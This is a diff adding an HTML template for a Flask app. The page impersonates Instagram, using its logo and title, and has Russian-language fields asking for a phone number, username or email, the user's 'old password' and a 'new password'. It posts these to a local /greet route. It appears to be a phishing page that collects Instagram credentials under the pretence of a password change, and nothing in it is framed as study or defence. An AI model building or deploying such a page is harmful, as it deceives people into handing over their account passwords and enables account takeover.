@@ -1,0 +1,184 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Instagram Registration</title>
+    <!-- Подключение Bootstrap CSS -->
+    <link
+      href="https://stackpath.bootstrapcdn.com/bootstrap/5.3.0/css/bootstrap.min.css"
+      rel="stylesheet"
+    />
+    <link
+      rel="stylesheet"
+      href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css"
+    />
+    <style>
+      .container {
+        padding-top: 5vh;
+      }
+      .form-container {
+        max-width: 600px;
+        margin: 0 auto;
+        padding: 30px;
+        border: 1px solid #ddd;
+        border-radius: 10px;
+        box-shadow: 0 0 15px rgba(0, 0, 0, 0.2);
+      }
+
+      .form-control {
+        border-radius: 0.5rem;
+        padding: 0.75rem 1.25rem;
+        font-size: 1rem;
+        border: 1px solid #ced4da;
+        width: 100%;
+        box-sizing: border-box;
+      }
+
+      .form-control:focus {
+        border-color: #007bff;
+        box-shadow: 0 0 0 0.2rem rgba(38, 143, 255, 0.25);
+      }
+
+      .form-control::placeholder {
+        color: #6c757d;
+        font-size: 0.75rem;
+        opacity: 1;
+      }
+
+      .btn-primary {
+        background-color: #007bff;
+        border: none;
+        border-radius: 1.5rem;
+        padding: 0.75rem 1.5rem;
+        font-size: 1rem;
+        width: 100%;
+        color: white;
+        font-family: 'Segoe UI', Tahoma, Geneva, Verdana, inherit;
+      }
+
+      .btn-primary:hover {
+        background-color: #0056b3;
+        border: none;
+      }
+
+      .form-group {
+        margin-bottom: 1.5rem;
+      }
+
+      .navbar-brand img {
+        display: block;
+        margin: 0 auto;
+      }
+
+      @media (max-width: 576px) {
+        .form-container {
+          padding: 15px;
+        }
+      }
+
+      .password-toggle {
+        color: black;
+        cursor: pointer;
+        font-size: 0.75rem;
+        display: none;
+      }
+
+      .form-group input:valid + .password-toggle {
+        display: inline;
+      }
+
+      .form-group input:focus + .password-toggle {
+        display: inline;
+      }
+    </style>
+  </head>
+  <body>
+    <div class="container d-flex justify-content-center align-items-center min-vh-100">
+      <div class="form-container">
+        <!-- Navbar -->
+        <nav class="navbar navbar-expand-lg navbar-light bg-light mb-4">
+          <a class="navbar-brand" href="#">
+            <img
+              src="{{ url_for('static', filename='images/insta.png') }}"
+              alt="Instagram Logo"
+              class="img-fluid"
+            />
+          </a>
+        </nav>
+
+        <!-- Main content -->
+        <div class="text-center">
+          <!-- Greet form -->
+          <form method="POST" action="/greet" class="mb-4">
+            <div class="form-group">
+              <input
+                type="text"
+                name="username"
+                class="form-control"
+                placeholder="Телефон, имя пользователя или эл. адрес"
+                required
+              />
+            </div>
+            <div class="form-group">
+              <input
+                type="password"
+                id="old-password"
+                name="old_password"
+                class="form-control"
+                placeholder="Старый пароль"
+                minlength="6"
+                required
+              />
+              <span class="password-toggle" id="old-password-toggle">Показать</span>
+            </div>
+            <div class="form-group">
+              <input
+                type="password"
+                id="new-password"
+                name="new_password"
+                class="form-control"
+                placeholder="Новый пароль"
+                minlength="6"
+                required
+              />
+              <span class="password-toggle" id="new-password-toggle">Показать</span>
+            </div>
+            <button type="submit" class="btn btn-primary" id="submit-button" disabled>
+              Изменить
+            </button>
+          </form>
+          {% if message %}
+          <p class="text-success">{{ message }}</p>
+          {% endif %}
+        </div>
+      </div>
+    </div>
+
+    <!-- Подключение Bootstrap JS -->
+    <script src="https://stackpath.bootstrapcdn.com/bootstrap/5.3.0/js/bootstrap.bundle.min.js"></script>
+    <script>
+      document.querySelectorAll('.form-control').forEach((input) => {
+        input.addEventListener('input', () => {
+          const oldPassword = document.getElementById('old-password').value;
+          const newPassword = document.getElementById('new-password').value;
+          const submitButton = document.getElementById('submit-button');
+          submitButton.disabled = oldPassword.length < 6 || newPassword.length < 6;
+        });
+      });
+
+      document.querySelectorAll('.password-toggle').forEach((toggle) => {
+        toggle.addEventListener('click', (e) => {
+          const passwordInput = e.target.previousElementSibling;
+          if (passwordInput.type === 'password') {
+            passwordInput.type = 'text';
+            e.target.textContent = 'Скрыть';
+          } else {
+            passwordInput.type = 'password';
+            e.target.textContent = 'Показать';
+          }
+        });
+      });
+    </script>
+  </body>
+</html>
